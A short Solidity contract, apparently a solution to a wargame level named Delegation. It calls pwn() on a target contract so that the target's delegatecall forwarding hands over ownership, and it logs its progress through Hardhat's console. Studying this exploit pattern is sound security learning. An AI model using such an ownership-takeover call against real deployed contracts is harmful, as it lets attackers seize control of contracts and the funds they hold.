// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

import "hardhat/console.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        console.log("Hacking contract...");
        console.log("address: ", address(this));
        (bool success, ) = contractAddress.call(
            abi.encodeWithSignature("pwn()")
        );
        console.log("success: ", success);
    }
}
